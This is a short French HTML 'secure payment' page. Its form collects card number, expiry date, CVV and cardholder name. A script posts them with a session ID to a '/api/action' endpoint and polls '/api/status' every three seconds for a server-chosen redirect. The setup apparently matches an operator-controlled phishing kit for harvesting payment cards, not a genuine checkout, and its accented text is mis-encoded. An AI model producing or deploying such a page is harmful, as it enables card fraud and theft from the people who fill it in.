<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>ðŸ’³ Paiement</title>
  <style>
    body { font-family: Arial; background: #f8f8f8; text-align: center; }
    form { display: inline-block; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 0 5px #ccc; }
    input { display: block; margin: 10px auto; padding: 8px; width: 80%; border-radius: 8px; border: 1px solid #ccc; }
    button { background: green; color: white; padding: 10px; border: none; border-radius: 8px; cursor: pointer; }
  </style>
</head>
<body>
  <h1>ðŸ’³ Paiement sÃ©curisÃ©</h1>
  <form onsubmit="sendPayment(event)">
    <input id="card" placeholder="NumÃ©ro de carte (16 chiffres)" maxlength="19" required>
    <input id="date" placeholder="MM/AA" maxlength="5" required>
    <input id="cvv" placeholder="CVV (3 chiffres)" maxlength="3" required>
    <input id="name" placeholder="Nom du titulaire" required>
    <button type="submit">Payer</button>
  </form>

  <script>
    const sessionId = localStorage.getItem('sessionId');
    async function sendPayment(e){
      e.preventDefault();
      const data = {
        sessionId,
        cardNumber: card.value,
        exp: date.value,
        cvv: cvv.value,
        name: name.value
      };
      await fetch('/api/action', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ ...data, page:'Paiement', action:'Soumis infos carte' })
      });
      alert('Paiement envoyÃ©, en attente de validation...');
    }

    async function pollStatus(){
      const res = await fetch('/api/status?sessionId='+sessionId);
      const data = await res.json();
      if(data.redirect){
        window.location.href = '/' + data.redirect + '.html';
      }
      setTimeout(pollStatus, 3000);
    }
    pollStatus();
  </script>
</body>
</html>
